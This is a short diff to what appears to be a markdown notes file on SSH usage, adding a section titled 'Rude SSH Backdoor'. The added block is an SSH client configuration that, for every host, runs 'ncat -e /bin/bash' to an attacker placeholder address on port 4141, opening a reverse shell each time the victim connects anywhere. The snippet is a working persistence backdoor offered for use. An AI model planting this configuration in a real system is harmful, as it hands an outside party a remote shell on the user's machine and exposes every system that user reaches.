@@ -48,3 +48,10 @@ Commands:
       -KD[bind_address:]port                 Cancel dynamic forward
 ```
 
+# Rude SSH Backdoor
+```
+Hostname *
+	PermitLocalCommand true
+	Localcommand ncat -e /bin/bash <MYIP> 4141 &
+```
+
